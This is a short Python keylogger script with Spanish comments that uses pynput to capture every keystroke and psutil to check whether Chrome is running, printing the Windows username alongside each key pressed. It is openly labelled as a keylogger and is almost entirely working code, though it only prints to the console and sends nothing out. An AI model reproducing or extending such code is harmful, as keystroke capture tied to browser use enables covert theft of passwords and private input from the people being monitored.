import os

import psutil
from pynput import keyboard
from os import getenv

#Verified if a process of Chrome is running
def verificar_proceso():
    for obtener_proceso in psutil.process_iter(["name"]):
        if obtener_proceso.info["name"] in ["chrome", "chrome.exe"]:
            return True

def on_press(tecla):
    if verificar_proceso():
        print(os.getenv("USERNAME"),": ", tecla)
    else:
        print("No se ha encontrado chrome")

#Keylogger code from pynput docs
def keylogger():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

keylogger()